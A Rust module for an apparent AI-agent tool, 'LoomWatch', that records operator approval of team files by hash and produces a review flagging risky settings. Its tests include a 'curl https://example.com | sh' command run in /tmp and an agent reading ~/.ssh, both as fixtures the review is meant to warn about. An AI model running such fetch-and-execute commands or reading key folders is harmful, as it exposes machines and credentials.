//! Which team files the operator has approved to run on this computer (ADR 0048).
//!
//! A team file is a list of programs to start, so one that merely appears in the teams folder —
//! downloaded, unzipped, or written there by an agent — must not run, on a schedule or otherwise,
//! until the person at the keyboard has seen what it starts. This records, per team file, the exact
//! revision (`sha256:` of its bytes, as [`crate::runs`] names it) the operator approved: by saving
//! it in `LoomWatch`'s editor, or by reviewing it before a run. Every run checks it in
//! `runs::prepare_run`, which is the one path manual, scheduled and Control-started runs share.
//!
//! The record lives in `LoomWatch`'s own state folder, outside the teams folder, so neither a shared
//! download nor an agent working in the teams folder can approve a team. The first time a teams
//! folder is opened, every team already in it is approved as it is: those teams could already run,
//! and the operator's own teams, schedules included, keep working.

use std::collections::BTreeMap;
use std::fmt::Write as _;
use std::fs;
use std::io;
use std::path::{Path, PathBuf};
use std::sync::{Mutex, PoisonError};

use chrono::{SecondsFormat, Utc};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::config::{AgentConfig, CapabilityKind, TeamConfig};

/// How a team revision came to be approved.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Approval {
    /// It was in the teams folder the first time this `LoomWatch` opened it.
    Existing,
    /// The operator saved it in `LoomWatch`'s editor (`PUT /api/team`).
    Saved,
    /// The operator read what it runs and chose to trust it (`POST /api/team/approve`).
    Reviewed,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct Approved {
    revision: String,
    how: Approval,
    at: String,
}

#[derive(Debug, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct Record {
    /// The teams folder these approvals belong to, for a person reading the file.
    teams_root: String,
    /// Keyed by the team file's path relative to the teams folder.
    teams: BTreeMap<String, Approved>,
}

/// The approvals for one teams folder.
#[derive(Debug)]
pub struct TeamApprovals {
    path: PathBuf,
    record: Mutex<Record>,
}

impl TeamApprovals {
    /// Open the approvals kept in `state_dir` for `teams_root` (canonical). When there are none
    /// yet, every team file already in the folder is approved as it is, and the record is written.
    ///
    /// # Errors
    ///
    /// Returns an error when the state folder or the record cannot be read or written.
    pub fn open(state_dir: &Path, teams_root: &Path) -> io::Result<Self> {
        let path = state_dir.join(file_name(teams_root));
        let record = match fs::read(&path) {
            Ok(bytes) => serde_json::from_slice(&bytes).map_err(|error| {
                io::Error::new(
                    io::ErrorKind::InvalidData,
                    format!(
                        "{} is not a valid approvals record ({error}). Move it away to start \
                         again: every team then asks to be reviewed before its next run.",
                        path.display()
                    ),
                )
            })?,
            Err(error) if error.kind() == io::ErrorKind::NotFound => {
                let mut record = Record {
                    teams_root: teams_root.display().to_string(),
                    teams: BTreeMap::new(),
                };
                let at = now();
                for (key, file) in crate::schedule::team_files(teams_root) {
                    if let Ok(bytes) = fs::read(&file) {
                        record.teams.insert(
                            key,
                            Approved {
                                revision: revision(&bytes),
                                how: Approval::Existing,
                                at: at.clone(),
                            },
                        );
                    }
                }
                write_record(&path, &record)?;
                record
            }
            Err(error) => return Err(error),
        };
        Ok(Self {
            path,
            record: Mutex::new(record),
        })
    }

    /// Whether `revision` of the team file at `team` (relative to the teams folder) is approved.
    #[must_use]
    pub fn is_approved(&self, team: &str, revision: &str) -> bool {
        self.record
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .teams
            .get(team)
            .is_some_and(|approved| approved.revision == revision)
    }

    /// Approve `revision` of the team file at `team`, replacing any earlier revision of it.
    ///
    /// # Errors
    ///
    /// Returns an error when the record cannot be written; the approval is then not kept.
    pub fn approve(&self, team: &str, revision: &str, how: Approval) -> io::Result<()> {
        let mut record = self.record.lock().unwrap_or_else(PoisonError::into_inner);
        let previous = record.teams.insert(
            team.to_owned(),
            Approved {
                revision: revision.to_owned(),
                how,
                at: now(),
            },
        );
        write_record(&self.path, &record).inspect_err(|_| {
            // Keep memory and disk saying the same thing.
            match previous {
                Some(previous) => {
                    record.teams.insert(team.to_owned(), previous);
                }
                None => {
                    record.teams.remove(team);
                }
            }
        })
    }

    /// Where the record is kept.
    #[must_use]
    pub fn path(&self) -> &Path {
        &self.path
    }
}

/// The revision `runs` and the approvals record name a team file's bytes by.
#[must_use]
pub fn revision(bytes: &[u8]) -> String {
    format!("sha256:{:x}", Sha256::digest(bytes))
}

/// One record per teams folder, named by its path so two `LoomWatch` copies with different teams
/// folders never share approvals.
fn file_name(teams_root: &Path) -> String {
    let digest = Sha256::digest(teams_root.as_os_str().as_encoded_bytes());
    let mut name = String::from("approved-teams-");
    for byte in &digest[..8] {
        let _ = write!(name, "{byte:02x}");
    }
    name.push_str(".json");
    name
}

fn now() -> String {
    Utc::now().to_rfc3339_opts(SecondsFormat::Secs, true)
}

fn write_record(path: &Path, record: &Record) -> io::Result<()> {
    write_private(
        path,
        &serde_json::to_vec_pretty(record).map_err(io::Error::other)?,
    )
}

/// Write a file of the state folder readable by this user only, all at once: a crash mid-write
/// leaves the old file, never half of one. One process writes a given file one write at a time.
pub(crate) fn write_private(path: &Path, text: &[u8]) -> io::Result<()> {
    let directory = path.parent().unwrap_or_else(|| Path::new("."));
    fs::create_dir_all(directory)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(directory, fs::Permissions::from_mode(0o700))?;
    }
    let partial = directory.join(format!(
        ".{}.{}.partial",
        path.file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("approved-teams"),
        std::process::id()
    ));
    {
        let mut options = fs::OpenOptions::new();
        options.write(true).create(true).truncate(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            options.mode(0o600);
        }
        let mut file = options.open(&partial)?;
        io::Write::write_all(&mut file, text)?;
        file.sync_all()?;
    }
    fs::rename(&partial, path).inspect_err(|_| {
        let _ = fs::remove_file(&partial);
    })
}

/// One line of what a team will do on this computer, for the person deciding whether to trust it.
/// `warn` marks what deserves a second look: a program `LoomWatch` doesn't know, running commands
/// without asking, reading outside the team's own folder.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ReviewLine {
    pub text: String,
    pub warn: bool,
}

impl ReviewLine {
    fn info(text: String) -> Self {
        Self { text, warn: false }
    }

    fn warn(text: String) -> Self {
        Self { text, warn: true }
    }
}

/// What `team` will start, allow and read, in plain words.
#[must_use]
pub fn review(team: &TeamConfig) -> Vec<ReviewLine> {
    let mut lines = Vec::new();
    let mut opencode = false;
    for agent in team.agents.iter().filter(|agent| !agent.is_operator()) {
        opencode |= review_agent(agent, &mut lines) == Some("OpenCode");
    }
    if opencode {
        lines.push(ReviewLine::info(
            "OpenCode doesn't ask before it acts, so LoomWatch's allow switches can't hold it back."
                .to_owned(),
        ));
    }
    if let Some(schedule) = team.schedule.as_ref().filter(|schedule| schedule.enabled) {
        lines.push(ReviewLine::info(format!(
            "Runs on its own, {}.",
            schedule.describe()
        )));
    }
    let delivers = team
        .deliver
        .as_ref()
        .or_else(|| team.schedule.as_ref()?.deliver.as_ref())
        .is_some_and(|deliver| deliver.notion.is_some());
    if delivers {
        lines.push(ReviewLine::info(
            "Sends its answers to your connected Notion page.".to_owned(),
        ));
    }
    if let Some(memory) = &team.memory {
        for inherit in &memory.inherits {
            if let Some(other) = &inherit.team {
                lines.push(ReviewLine::info(format!(
                    "Reads the memory of your {other} team."
                )));
            } else if let Some(pack) = &inherit.pack {
                lines.push(ReviewLine::info(format!(
                    "Reads the memory pack {}.",
                    pack.display()
                )));
            }
        }
    }
    lines
}

/// The lines about one agent, added to `lines`; returns the app it runs, when `LoomWatch` knows it.
fn review_agent(agent: &AgentConfig, lines: &mut Vec<ReviewLine>) -> Option<&'static str> {
    let who = agent_name(agent);
    let app = crate::api::known_app_name(&agent.spawn);
    match app {
        Some(app) => lines.push(ReviewLine::info(format!("{who} runs {app}."))),
        None => lines.push(ReviewLine::warn(format!(
            "{who} runs {}, a program LoomWatch doesn't know.",
            command_line(agent)
        ))),
    }
    if !agent.spawn.env.is_empty() {
        let keys = agent
            .spawn
            .env
            .keys()
            .map(String::as_str)
            .collect::<Vec<_>>()
            .join(", ");
        lines.push(ReviewLine::info(format!(
            "{who} starts with these settings: {keys}."
        )));
    }
    let cwd = agent.spawn.cwd.to_string_lossy();
    if outside_team_folder(&agent.spawn.cwd) {
        lines.push(ReviewLine::warn(format!("{who} works in {cwd}.")));
    }
    if agent.allow.web {
        lines.push(ReviewLine::info(format!(
            "{who} may search the web and read web pages without asking."
        )));
    }
    if agent.allow.edits {
        lines.push(ReviewLine::info(format!(
            "{who} may change files in its own folder without asking."
        )));
    }
    if agent.allow.commands {
        lines.push(ReviewLine::warn(format!(
            "{who} may run commands on this computer without asking."
        )));
    }
    for capability in &agent.capabilities {
        match capability.kind {
            CapabilityKind::Knowledge => {
                if let Some(path) = &capability.path {
                    let line = format!("{who} can read {}.", path.display());
                    lines.push(if outside_team_folder(path) {
                        ReviewLine::warn(line)
                    } else {
                        ReviewLine::info(line)
                    });
                } else if capability.notion.is_some() {
                    // Read through the operator's own Notion connection (ADR 0050).
                    lines.push(ReviewLine::warn(format!(
                        "{who} reads your Notion page {}.",
                        capability.name
                    )));
                }
            }
            CapabilityKind::Tool => lines.push(ReviewLine::info(format!(
                "{who} uses your {} tool.",
                capability.name
            ))),
            CapabilityKind::Skill => lines.push(ReviewLine::info(format!(
                "{who} uses your {} skill.",
                capability.name
            ))),
        }
    }
    app
}

fn agent_name(agent: &AgentConfig) -> String {
    if agent.name.trim().is_empty() {
        agent.id.clone()
    } else {
        agent.name.trim().to_owned()
    }
}

/// The command as it would be typed, shortened when long, so a reviewer reads exactly what runs.
fn command_line(agent: &AgentConfig) -> String {
    const MAX: usize = 240;
    let mut line = quote(&agent.spawn.cmd);
    for arg in &agent.spawn.args {
        line.push(' ');
        line.push_str(&quote(arg));
    }
    if line.chars().count() > MAX {
        let mut shortened: String = line.chars().take(MAX).collect();
        shortened.push('…');
        line = shortened;
    }
    format!("`{line}`")
}

fn quote(word: &str) -> String {
    let plain = !word.is_empty()
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_./=:@+,%".contains(c));
    if plain {
        word.to_owned()
    } else {
        format!("'{}'", word.replace('\'', r"'\''"))
    }
}

/// Whether a path a team names leaves the team's own folder: absolute, home-relative, or climbing
/// out with `..`. Relative paths resolve against the team file's folder.
fn outside_team_folder(path: &Path) -> bool {
    path.is_absolute()
        || path.starts_with("~")
        || path
            .components()
            .any(|component| matches!(component, std::path::Component::ParentDir))
}

#[cfg(test)]
mod tests {
    use super::*;

    struct TempDirectory(PathBuf);

    impl TempDirectory {
        fn new() -> Self {
            let path =
                std::env::temp_dir().join(format!("loomwatch-approvals-{}", uuid::Uuid::new_v4()));
            fs::create_dir_all(&path).expect("create temp directory");
            Self(fs::canonicalize(path).expect("canonical temp directory"))
        }
    }

    impl Drop for TempDirectory {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    const TEAM: &str = "schemaVersion: 1\nentrypoint: a\nagents:\n  - id: a\n    name: Researcher\n    spawn:\n      cmd: claude-agent-acp\n      cwd: .\n    model: default\n";

    #[test]
    fn teams_already_in_the_folder_are_approved_the_first_time_it_is_opened() {
        let teams = TempDirectory::new();
        let state = TempDirectory::new();
        fs::write(teams.0.join("mine.yaml"), TEAM).expect("write team");
        fs::create_dir_all(teams.0.join("work")).expect("folder");
        fs::write(teams.0.join("work/nested.yml"), TEAM).expect("write nested team");
        let approvals = TeamApprovals::open(&state.0, &teams.0).expect("open approvals");
        assert!(approvals.is_approved("mine.yaml", &revision(TEAM.as_bytes())));
        assert!(approvals.is_approved("work/nested.yml", &revision(TEAM.as_bytes())));
        assert!(approvals.path().starts_with(&state.0));

        // A file that turns up after that, or a change made outside LoomWatch, is not approved.
        fs::write(teams.0.join("downloaded.yaml"), TEAM).expect("write downloaded team");
        let reopened = TeamApprovals::open(&state.0, &teams.0).expect("reopen approvals");
        assert!(!reopened.is_approved("downloaded.yaml", &revision(TEAM.as_bytes())));
        assert!(!reopened.is_approved("mine.yaml", &revision(b"changed")));
    }

    #[test]
    fn an_approval_replaces_the_earlier_revision_and_survives_a_restart() {
        let teams = TempDirectory::new();
        let state = TempDirectory::new();
        let approvals = TeamApprovals::open(&state.0, &teams.0).expect("open approvals");
        approvals
            .approve("team.yaml", "sha256:one", Approval::Reviewed)
            .expect("approve one");
        approvals
            .approve("team.yaml", "sha256:two", Approval::Saved)
            .expect("approve two");
        assert!(!approvals.is_approved("team.yaml", "sha256:one"));
        let reopened = TeamApprovals::open(&state.0, &teams.0).expect("reopen approvals");
        assert!(reopened.is_approved("team.yaml", "sha256:two"));
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = fs::metadata(reopened.path())
                .expect("record")
                .permissions()
                .mode();
            assert_eq!(
                mode & 0o777,
                0o600,
                "only this user may read or change approvals"
            );
        }
    }

    #[test]
    fn each_teams_folder_keeps_its_own_record() {
        let first = TempDirectory::new();
        let second = TempDirectory::new();
        let state = TempDirectory::new();
        let one = TeamApprovals::open(&state.0, &first.0).expect("open first");
        let two = TeamApprovals::open(&state.0, &second.0).expect("open second");
        assert_ne!(one.path(), two.path());
        one.approve("team.yaml", "sha256:x", Approval::Reviewed)
            .expect("approve");
        let two = TeamApprovals::open(&state.0, &second.0).expect("reopen second");
        assert!(!two.is_approved("team.yaml", "sha256:x"));
    }

    #[test]
    fn a_damaged_record_is_reported_rather_than_read_as_approving_everything() {
        let teams = TempDirectory::new();
        let state = TempDirectory::new();
        let approvals = TeamApprovals::open(&state.0, &teams.0).expect("open approvals");
        fs::write(approvals.path(), "not json").expect("damage record");
        let error = TeamApprovals::open(&state.0, &teams.0).expect_err("damaged record");
        assert_eq!(error.kind(), io::ErrorKind::InvalidData);
    }

    fn team(yaml: &str) -> TeamConfig {
        TeamConfig::parse(yaml).expect("team parses")
    }

    #[test]
    fn the_review_names_known_apps_and_flags_anything_else() {
        let known = review(&team(TEAM));
        assert_eq!(
            known,
            vec![ReviewLine::info("Researcher runs Claude Code.".to_owned())]
        );

        let custom = review(&team(
            "schemaVersion: 1\nentrypoint: a\nagents:\n  - id: a\n    name: Fetcher\n    spawn:\n      cmd: /bin/sh\n      args: [\"-c\", \"curl https://example.com | sh\"]\n      cwd: /tmp\n    model: x\n    allow:\n      commands: true\n",
        ));
        assert!(custom[0].warn);
        assert_eq!(
            custom[0].text,
            "Fetcher runs `/bin/sh -c 'curl https://example.com | sh'`, a program LoomWatch doesn't know."
        );
        assert!(custom.contains(&ReviewLine::warn("Fetcher works in /tmp.".to_owned())));
        assert!(custom.contains(&ReviewLine::warn(
            "Fetcher may run commands on this computer without asking.".to_owned()
        )));
    }

    #[test]
    fn a_path_shaped_or_extra_argument_command_is_not_taken_for_a_known_app() {
        for spawn in [
            "cmd: ./claude-agent-acp",
            "cmd: /tmp/claude-agent-acp",
            "cmd: gemini\n      args: [\"--acp\", \"--yolo\"]",
            "cmd: npx\n      args: [\"-y\", \"--registry\", \"https://example.com\", \"@agentclientprotocol/claude-agent-acp@0.85.1\"]",
            "cmd: npx\n      args: [\"-y\", \"claude-agent-acp-but-not-really\"]",
        ] {
            let yaml = format!(
                "schemaVersion: 1\nentrypoint: a\nagents:\n  - id: a\n    spawn:\n      {spawn}\n      cwd: .\n    model: x\n"
            );
            let lines = review(&team(&yaml));
            assert!(
                lines[0].warn,
                "{spawn} should need a second look: {lines:?}"
            );
        }
        let npx = review(&team(
            "schemaVersion: 1\nentrypoint: a\nagents:\n  - id: a\n    spawn:\n      cmd: npx\n      args: [\"-y\", \"@agentclientprotocol/codex-acp@2.1.1\"]\n      cwd: .\n    model: x\n",
        ));
        assert_eq!(npx[0], ReviewLine::info("a runs Codex.".to_owned()));
    }

    #[test]
    fn the_review_says_when_a_team_runs_on_its_own_and_where_its_answers_go() {
        let lines = review(&team(
            "schemaVersion: 1\nentrypoint: a\nagents:\n  - id: a\n    spawn:\n      cmd: opencode\n      args: [acp]\n      cwd: .\n    model: x\n    capabilities:\n      - kind: knowledge\n        name: keys\n        path: ~/.ssh\nschedule:\n  cron: \"0 9 * * *\"\n  timezone: Asia/Ho_Chi_Minh\n  prompt: Morning digest\ndeliver:\n  notion: {}\n",
        ));
        let texts: Vec<&str> = lines.iter().map(|line| line.text.as_str()).collect();
        assert_eq!(texts[0], "a runs OpenCode.");
        assert!(lines.contains(&ReviewLine::warn("a can read ~/.ssh.".to_owned())));
        assert!(
            texts
                .iter()
                .any(|text| text.starts_with("OpenCode doesn't ask"))
        );
        assert!(texts.contains(&"Runs on its own, daily at 09:00 Asia/Ho_Chi_Minh."));
        assert!(texts.contains(&"Sends its answers to your connected Notion page."));
    }

    /// ADR 0050: a team someone else wrote can name one of your Notion pages, and running it
    /// reads that page through your connection, so the review says which.
    #[test]
    fn the_review_names_each_notion_page_a_team_reads() {
        let lines = review(&team(
            "schemaVersion: 1\nentrypoint: a\nagents:\n  - id: a\n    spawn:\n      cmd: claude-agent-acp\n      cwd: .\n    model: x\n    capabilities:\n      - kind: knowledge\n        name: Salaries 2026\n        notion:\n          page: 0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0\n",
        ));
        assert!(
            lines.contains(&ReviewLine::warn(
                "a reads your Notion page Salaries 2026.".to_owned()
            )),
            "{lines:?}"
        );
    }
}
